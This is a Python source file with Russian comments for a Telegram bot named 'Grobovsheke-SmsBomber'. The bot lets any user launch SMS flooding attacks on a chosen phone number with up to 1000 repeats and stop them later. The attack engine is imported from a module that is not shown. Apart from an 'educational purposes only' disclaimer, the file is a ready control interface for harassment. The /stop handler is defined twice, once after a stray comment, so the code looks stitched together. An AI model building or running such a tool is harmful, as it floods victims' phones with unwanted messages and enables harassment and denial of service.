import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from dotenv import load_dotenv

# Загружаем переменные окружения из .env
load_dotenv()

# Инициализируем бота
bot = Bot(token=os.getenv("TELEGRAM_BOT_TOKEN") or "")
dp = Dispatcher()

# Хранилище для активных атак
active_attacks = {}

# Command: /start
@dp.message(Command("start"))
async def start_command(message: types.Message):
    await message.answer(
        "💣 **Добро пожаловать в Grobovsheke-SmsBomber!**\n\n"
        "📌 **Доступные команды:**\n"
        "/start - Начать работу\n"
        "/attack <номер> <количество повторов> - Запустить атаку\n"
        "/stop - Остановить атаку\n"
        "/help - Помощь\n\n"
        "⚠️ **Внимание:** Используйте этот инструмент только в образовательных целях!"
    )

# Command: /help
@dp.message(Command("help"))
async def help_command(message: types.Message):
    await message.answer(
        "📖 **Справка по Grobovsheke-SmsBomber**\n\n"
        "🔹 **/attack <номер> <количество повторов>** - Запускает атаку на указанный номер.\n"
        "Пример: `/attack 79123456789 5`\n\n"
        "🔹 **/stop** - Останавливает текущую атаку.\n\n"
        "⚠️ **Предупреждение:** Не используйте этот инструмент для нарушения законов!"
    )

# Command: /attack
@dp.message(Command("attack"))
async def attack_command(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()

    if len(args) < 3:
        await message.answer("❌ **Ошибка:** Укажите номер и количество повторов. Пример: `/attack 79123456789 5`")
        return

    number = args[1]
    replay = args[2]

    if not number.isdigit() or not replay.isdigit():
        await message.answer("❌ **Ошибка:** Номер и количество повторов должны быть числами!")
        return

    if int(replay) < 1 or int(replay) > 1000:
        await message.answer("❌ **Ошибка:** Количество повторов должно быть от 1 до 1000!")
        return

    # Сохраняем информацию об атаке
    active_attacks[user_id] = {
        "number": number,
        "replay": replay,
        "status": "running"
    }

    # Запускаем атаку в отдельном потоке (чтобы не блокировать бота)
    from Core.Run import start_async_attacks
    from threading import Thread

    def run_attack():
        start_async_attacks(number, replay)
        active_attacks[user_id]["status"] = "completed"

    attack_thread = Thread(target=run_attack)
    attack_thread.start()

    await message.answer(f"✅ **Атака запущена!**\nНомер: `{number}`\nПовторов: `{replay}`")

# Command: /stop
@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        active_attacks[user_id]["status"] = "stopped"
        await message.answer("⏹️ **Атака остановлена!**")
    else:
        await message.answer("❌ **Ошибка:** Нет активных атак для остановки.")

# Запуск бота
async def start_telegram_bot():
    await dp.start_polling(bot)

# Остановка бота
async def stop_telegram_bot():
    await bot.session.close()
    # Внутри функции stop_command:
from Core.Run import stop_attacks

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
        active_attacks[user_id]["status"] = "stopped"
        stop_attacks()  # Останавливаем все атаки
        await message.answer("⏹️ **Атака остановлена!**")
    else:
        await message.answer("❌ **Ошибка:** Нет активных атак для остановки.")